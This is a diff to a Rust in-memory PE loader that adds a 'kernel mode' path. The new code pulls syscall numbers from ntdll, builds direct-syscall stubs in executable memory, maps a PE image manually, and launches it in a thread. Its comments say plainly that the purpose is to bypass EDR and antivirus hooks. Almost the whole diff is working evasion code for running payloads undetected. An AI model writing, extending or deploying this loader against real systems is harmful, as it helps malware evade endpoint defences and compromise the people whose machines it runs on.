@@ -13,6 +13,7 @@ use winapi::{
             IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT,
             IMAGE_DIRECTORY_ENTRY_TLS, IMAGE_ORDINAL_FLAG64, IMAGE_REL_BASED_DIR64, MEM_COMMIT,
             MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, SECTION_ALL_ACCESS, SEC_COMMIT,
+            PAGE_EXECUTE_READ, PAGE_EXECUTE, PAGE_READWRITE, PAGE_READONLY, PAGE_NOACCESS,
         },
     },
 };
@@ -25,6 +26,7 @@ pub enum LoaderType {
     NtSection = 0,
     NtVirtualMemory = 1,
     Classic = 2,
+    KernelMode = 3,
 }
 
 impl From<u8> for LoaderType {
@@ -32,6 +34,7 @@ impl From<u8> for LoaderType {
         match v {
             1 => LoaderType::NtVirtualMemory,
             2 => LoaderType::Classic,
+            3 => LoaderType::KernelMode,
             _ => LoaderType::NtSection,
         }
     }
@@ -257,6 +260,14 @@ type NtFreeVirtualMemory = unsafe extern "system" fn(
     free_type: u32,
 ) -> NTSTATUS;
 
+type NtProtectVirtualMemory = unsafe extern "system" fn(
+    process_handle: HANDLE,
+    base_address: *mut PVOID,
+    region_size: *mut usize,
+    new_protect: u32,
+    old_protect: *mut u32,
+) -> NTSTATUS;
+
 // ─── Loader avec sections partagées ───────────────────────────────────────────
 
 #[cfg(target_os = "windows")]
@@ -419,6 +430,61 @@ unsafe fn load_nt_section(pe_bytes: &[u8]) -> ! {
     nt_close(section_handle);
 
     std::process::exit(0);
+}
+
+// ─── Helpers syscalls directs ─────────────────────────────────────────────────
+
+// Lit le SSN dans le stub ntdll : 4C 8B D1 B8 [ssn u32 LE] ...
+#[cfg(target_os = "windows")]
+unsafe fn get_syscall_number(ntdll_base: *mut u8, function_name: &str) -> Option<u32> {
+    let func = get_proc_address(ntdll_base, function_name)?;
+    let b = func as *const u8;
+    if *b == 0x4C && *b.add(1) == 0x8B && *b.add(2) == 0xD1 && *b.add(3) == 0xB8 {
+        Some(*(b.add(4) as *const u32))
+    } else {
+        None
+    }
+}
+
+// Alloue une page RWX et y écrit : mov r10,rcx ; mov eax,ssn ; syscall ; ret
+#[cfg(target_os = "windows")]
+unsafe fn make_syscall_stub(ssn: u32) -> *mut u8 {
+    let stub = VirtualAlloc(
+        ptr::null_mut(),
+        16,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE,
+    ) as *mut u8;
+    if stub.is_null() {
+        std::process::exit(1);
+    }
+    let bytes: [u8; 11] = [
+        0x4C, 0x8B, 0xD1,
+        0xB8,
+        (ssn & 0xFF) as u8,
+        ((ssn >> 8) & 0xFF) as u8,
+        ((ssn >> 16) & 0xFF) as u8,
+        ((ssn >> 24) & 0xFF) as u8,
+        0x0F, 0x05,
+        0xC3,
+    ];
+    ptr::copy_nonoverlapping(bytes.as_ptr(), stub, 11);
+    stub
+}
+
+// Convertit les flags de section PE en protection mémoire NT
+fn section_chars_to_protect(chars: u32) -> u32 {
+    let x = chars & 0x20000000 != 0;
+    let r = chars & 0x40000000 != 0;
+    let w = chars & 0x80000000 != 0;
+    match (x, r, w) {
+        (true,  true,  true)  => PAGE_EXECUTE_READWRITE,
+        (true,  true,  false) => PAGE_EXECUTE_READ,
+        (true,  false, _)     => PAGE_EXECUTE,
+        (false, true,  true)  => PAGE_READWRITE,
+        (false, true,  false) => PAGE_READONLY,
+        _                     => PAGE_NOACCESS,
+    }
 }
 
 // La fonction get_ntdll_base reste identique
@@ -648,7 +714,173 @@ pub unsafe fn load_and_run(pe_bytes: &[u8], loader: LoaderType) -> ! {
         LoaderType::NtSection => load_nt_section(pe_bytes),
         LoaderType::NtVirtualMemory => load_nt_virtual_memory(pe_bytes),
         LoaderType::Classic => load_classic(pe_bytes),
+        LoaderType::KernelMode => load_kernel_mode(pe_bytes),
     }
+}
+
+// ─── Loader Kernel Mode : syscalls directs + protections par section ──────────
+//
+// Résout les SSNs depuis les stubs ntdll en mémoire, génère des stubs RWX
+// qui sautent directement vers la couche noyau via SYSCALL — aucune fonction
+// ntdll n'est appelée pour les opérations mémoire/thread, ce qui bypass les
+// hooks userland (EDR/AV).  Les imports PE passent encore par LdrLoadDll car
+// le chargement des DLL dépend de l'infrastructure ntdll.
+
+#[cfg(target_os = "windows")]
+unsafe fn load_kernel_mode(pe_bytes: &[u8]) -> ! {
+    let ntdll_base = get_ntdll_base();
+
+    // ── Résolution des SSNs depuis les stubs ntdll ──
+    macro_rules! ssn {
+        ($name:expr) => {
+            get_syscall_number(ntdll_base, concat!($name, "\0"))
+                .unwrap_or_else(|| std::process::exit(1))
+        };
+    }
+
+    let nt_allocate_virtual_memory: NtAllocateVirtualMemory =
+        std::mem::transmute(make_syscall_stub(ssn!("NtAllocateVirtualMemory")));
+    let nt_free_virtual_memory: NtFreeVirtualMemory =
+        std::mem::transmute(make_syscall_stub(ssn!("NtFreeVirtualMemory")));
+    let nt_protect_virtual_memory: NtProtectVirtualMemory =
+        std::mem::transmute(make_syscall_stub(ssn!("NtProtectVirtualMemory")));
+    let nt_create_thread_ex: NtCreateThreadEx =
+        std::mem::transmute(make_syscall_stub(ssn!("NtCreateThreadEx")));
+    let nt_wait_for_single_object: NtWaitForSingleObject =
+        std::mem::transmute(make_syscall_stub(ssn!("NtWaitForSingleObject")));
+    let nt_close: NtClose =
+        std::mem::transmute(make_syscall_stub(ssn!("NtClose")));
+
+    // LdrLoadDll / LdrGetProcedureAddress restent via ntdll (infrastructure DLL)
+    let ldr_load_dll: LdrLoadDll =
+        std::mem::transmute(get_proc_address(ntdll_base, "LdrLoadDll\0").unwrap());
+    let ldr_get_procedure_address: LdrGetProcedureAddress =
+        std::mem::transmute(get_proc_address(ntdll_base, "LdrGetProcedureAddress\0").unwrap());
+
+    let base = pe_bytes.as_ptr();
+    let current_process = GetCurrentProcess();
+
+    // ── Validation PE ──
+    let dos = &*(base as *const ImageDosHeader);
+    if dos.e_magic != IMAGE_DOS_SIGNATURE {
+        std::process::exit(1);
+    }
+    let nt = &*((base.add(dos.e_lfanew as usize)) as *const ImageNtHeaders64);
+    if nt.signature != IMAGE_NT_SIGNATURE {
+        std::process::exit(1);
+    }
+
+    let img_size = nt.optional_header.size_of_image as usize;
+    let mut img_base: PVOID = ptr::null_mut();
+    let mut region_size = img_size;
+
+    // ── Allocation via syscall direct (PAGE_EXECUTE_READWRITE temporaire) ──
+    let status = nt_allocate_virtual_memory(
+        current_process,
+        &mut img_base,
+        0,
+        &mut region_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE,
+    );
+    if !NT_SUCCESS(status) || img_base.is_null() {
+        std::process::exit(1);
+    }
+    let img_base = img_base as *mut u8;
+
+    // ── Copie des headers et des sections ──
+    ptr::copy_nonoverlapping(base, img_base, nt.optional_header.size_of_headers as usize);
+
+    let sect_hdr = (base
+        .add(dos.e_lfanew as usize)
+        .add(4)
+        .add(std::mem::size_of::<ImageFileHeader>())
+        .add(nt.file_header.size_of_optional_header as usize))
+        as *const ImageSectionHeader;
+
+    for i in 0..nt.file_header.number_of_sections as usize {
+        let sect = &*sect_hdr.add(i);
+        if sect.size_of_raw_data == 0 {
+            continue;
+        }
+        ptr::copy_nonoverlapping(
+            base.add(sect.pointer_to_raw_data as usize),
+            img_base.add(sect.virtual_address as usize),
+            sect.size_of_raw_data as usize,
+        );
+    }
+
+    // ── Imports + relocations ──
+    if !fix_imports_nt(img_base, nt, ldr_load_dll, ldr_get_procedure_address) {
+        let mut fb: PVOID = img_base as PVOID;
+        let mut fs = 0usize;
+        nt_free_virtual_memory(current_process, &mut fb, &mut fs, MEM_RELEASE);
+        std::process::exit(1);
+    }
+
+    let delta = img_base as i64 - nt.optional_header.image_base as i64;
+    if !apply_relocations(img_base, delta, nt) {
+        let mut fb: PVOID = img_base as PVOID;
+        let mut fs = 0usize;
+        nt_free_virtual_memory(current_process, &mut fb, &mut fs, MEM_RELEASE);
+        std::process::exit(1);
+    }
+
+    // ── Protections mémoire par section via NtProtectVirtualMemory direct ──
+    // Remplace la page RWX globale par des droits fidèles aux flags PE
+    for i in 0..nt.file_header.number_of_sections as usize {
+        let sect = &*sect_hdr.add(i);
+        let sect_size = if sect.virtual_size != 0 {
+            sect.virtual_size as usize
+        } else {
+            sect.size_of_raw_data as usize
+        };
+        if sect_size == 0 {
+            continue;
+        }
+        let protect = section_chars_to_protect(sect.characteristics);
+        let mut sect_ptr: PVOID = img_base.add(sect.virtual_address as usize) as PVOID;
+        let mut sect_size_mut = sect_size;
+        let mut old_protect: u32 = 0;
+        nt_protect_virtual_memory(
+            current_process,
+            &mut sect_ptr,
+            &mut sect_size_mut,
+            protect,
+            &mut old_protect,
+        );
+    }
+
+    // ── TLS callbacks ──
+    run_tls_callbacks(img_base, nt);
+
+    // ── Création du thread d'exécution via syscall direct ──
+    let entry_point = img_base.add(nt.optional_header.address_of_entry_point as usize);
+    let mut thread_handle: HANDLE = ptr::null_mut();
+
+    let status = nt_create_thread_ex(
+        &mut thread_handle,
+        0x1FFFFF,
+        ptr::null_mut(),
+        current_process,
+        entry_point as PVOID,
+        ptr::null_mut(),
+        0,
+        0,
+        0,
+        0,
+        ptr::null_mut(),
+    );
+    if !NT_SUCCESS(status) || thread_handle.is_null() {
+        let mut fb: PVOID = img_base as PVOID;
+        let mut fs = 0usize;
+        nt_free_virtual_memory(current_process, &mut fb, &mut fs, MEM_RELEASE);
+        std::process::exit(1);
+    }
+
+    nt_wait_for_single_object(thread_handle, 0, ptr::null());
+    nt_close(thread_handle);
+    std::process::exit(0);
 }
 
 // ─── Loader NtAllocateVirtualMemory (loader2) ─────────────────────────────────
